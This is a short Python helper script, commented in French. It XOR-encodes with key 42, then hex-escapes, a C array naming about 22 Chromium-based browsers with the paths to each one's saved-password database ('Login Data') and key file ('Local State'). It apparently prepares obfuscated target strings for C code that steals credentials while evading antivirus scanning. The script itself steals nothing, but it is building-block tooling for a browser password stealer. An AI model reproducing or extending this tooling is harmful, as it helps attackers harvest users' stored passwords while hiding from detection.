import re

def xor_and_hex(s):
    return ''.join([f'\\x{ord(c) ^ 42:02x}' for c in s])

def process_line(line):
    parts = re.findall(r'L"([^"]*)"', line)
    processed_parts = [xor_and_hex(part) for part in parts]
    return f'{{L"{processed_parts[0]}", L"{processed_parts[1]}", L"{processed_parts[2]}"}}'

c_array = """
    {L"7Star", L"\\7Star\\7Star\\User Data\\Default\\Login Data",
     L"\\7Star\\7Star\\User Data\\Local State"},
    {L"Amigo", L"\\Amigo\\User Data\\Default\\Login Data",
     L"\\Amigo\\User Data\\Local State"},
    {L"Brave",
     L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
     L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"},
    {L"CentBrowser", L"\\CentBrowser\\User Data\\Default\\Login Data",
     L"\\CentBrowser\\User Data\\Local State"},
    {L"Chedot", L"\\Chedot\\User Data\\Default\\Login Data",
     L"\\Chedot\\User Data\\Local State"},
    {L"Chrome Beta", L"\\Google\\Chrome Beta\\User Data\\Default\\Login Data",
     L"\\Google\\Chrome Beta\\User Data\\Local State"},
    {L"Chrome Canary",
     L"\\Google\\Chrome SxS\\User Data\\Default\\Login Data",
     L"\\Google\\Chrome SxS\\User Data\\Local State"},
    {L"Chromium", L"\\Chromium\\User Data\\Default\\Login Data",
     L"\\Chromium\\User Data\\Local State"},
    {L"Microsoft Edge", L"\\Microsoft\\Edge\\User Data\\Default\\Login Data",
     L"\\Microsoft\\Edge\\User Data\\Local State"},
    {L"CocCoc", L"\\CocCoc\\Browser\\User Data\\Default\\Login Data",
     L"\\CocCoc\\Browser\\User Data\\Local State"},
    {L"Comodo Dragon", L"\\Comodo\\Dragon\\User Data\\Default\\Login Data",
     L"\\Comodo\\Dragon\\User Data\\Local State"},
    {L"Elements Browser",
     L"\\Elements Browser\\User Data\\Default\\Login Data",
     L"\\Elements Browser\\User Data\\Local State"},
    {L"DCBrowser", L"\\DCBrowser\\User Data\\Default\\Login Data",
     L"\\DCBrowser\\User Data\\Local State"},
    {L"Epic Privacy Browser",
     L"\\Epic Privacy Browser\\User Data\\Default\\Login Data",
     L"\\Epic Privacy Browser\\User Data\\Local State"},
    {L"Google Chrome", L"\\Google\\Chrome\\User Data\\Default\\Login Data",
     L"\\Google\\Chrome\\User Data\\Local State"},
    {L"Kometa", L"\\Kometa\\User Data\\Default\\Login Data",
     L"\\Kometa\\User Data\\Local State"},
    {L"Orbitum", L"\\Orbitum\\User Data\\Default\\Login Data",
     L"\\Orbitum\\User Data\\Local State"},
    {L"QQBrowser", L"\\Tencent\\QQBrowser\\User Data\\Default\\Login Data",
     L"\\Tencent\\QQBrowser\\User Data\\Local State"},
    {L"Sputnik", L"\\Sputnik\\Sputnik\\User Data\\Default\\Login Data",
     L"\\Sputnik\\Sputnik\\User Data\\Local State"},
    {L"Torch", L"\\Torch\\User Data\\Default\\Login Data",
     L"\\Torch\\User Data\\Local State"},
    {L"Uran", L"\\uCozMedia\\Uran\\User Data\\Default\\Login Data",
     L"\\uCozMedia\\Uran\\User Data\\Local State"},
    {L"Vivaldi", L"\\Vivaldi\\User Data\\Default\\Login Data",
     L"\\Vivaldi\\User Data\\Local State"},

"""

# Traiter chaque entrée du tableau comme une seule ligne
entries = re.findall(r'\{.*?\}', c_array, re.DOTALL)

for entry in entries:
    processed_line = process_line(entry)
    print(processed_line + ',')
